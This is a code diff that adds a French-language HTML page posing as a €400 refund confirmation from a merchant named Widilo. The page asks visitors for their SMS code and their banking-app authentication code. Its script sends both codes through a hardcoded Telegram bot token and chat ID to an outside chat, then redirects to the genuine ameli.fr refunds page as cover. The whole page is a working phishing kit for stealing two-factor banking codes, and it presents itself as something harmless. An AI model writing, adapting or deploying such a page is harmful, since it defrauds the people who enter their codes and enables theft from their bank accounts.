@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation de Remboursement</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f9fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 0.8s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .orange-box {
+            background-color: #ff9800;
+            color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .orange-box h2 {
+            margin: 0;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .info {
+            text-align: left;
+            font-size: 15px;
+            color: #444;
+            margin: 20px 0;
+        }
+
+        .info p {
+            margin: 5px 0;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .btn {
+            display: inline-block;
+            background-color: #4caf50;
+            color: #fff;
+            font-weight: bold;
+            padding: 12px;
+            border-radius: 6px;
+            width: 100%;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+
+        .footer-icons img {
+            width: 100%;
+            max-width: 250px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="orange-box">
+            <h2>Remboursement en attente de validation</h2>
+            <p>Merci de saisir le code reçu par SMS afin de valider votre demande de remboursement et de créditer le montant sur votre carte.</p>
+        </div>
+
+        <div class="info">
+            <p><strong>Marchand :</strong> Widilo</p>
+            <p><strong>Montant de remboursement :</strong> 400 €</p>
+            <p><strong>Date :</strong> <span id="current-date"></span></p>
+            <p><strong>N° de carte :</strong> **** **** **** ****</p>
+        </div>
+
+        <input type="tel" placeholder="Code SMS" id="code-sms" required>
+        <input type="tel" placeholder="Code Application - Authentification banque" id="Code application - Authentification banque" required>
+
+        <a href="#" class="btn" onclick="validate()">Valider</a>
+
+        <div class="footer-icons">
+            <img src="IMG_4261.jpeg" alt="Sécurité garantie">
+        </div>
+    </div>
+
+    <script>
+        function updateDate() {
+            const date = new Date();
+            const formattedDate = date.toLocaleDateString('fr-FR', {
+                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
+            });
+            document.getElementById('current-date').innerText = formattedDate;
+        }
+
+        updateDate();
+
+        function validate() {
+            const smsCode = document.getElementById('code-sms').value;
+            const bankCode = document.getElementById('Code application - Authentification banque').value;
+
+            if (smsCode === "" || bankCode === "") {
+                alert("Veuillez remplir tous les champs.");
+            } else {
+                const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
+                const chatId = "5372119436";
+                const message = `Code SMS: ${smsCode}\nCode Banque: ${bankCode}`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Votre validation a été soumise avec succès !"); 
+                   window.location.href = "https://www.ameli.fr/assure/remboursements";
+                    } else {
+                        alert("Erreur lors de l'envoi des données. Veuillez réessayer.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Erreur:", error);
+                   alert("Une erreur s'est produite. Veuillez réessayer.");
+                });
+            }
+        }
+    </script>
+</body>
+</html>
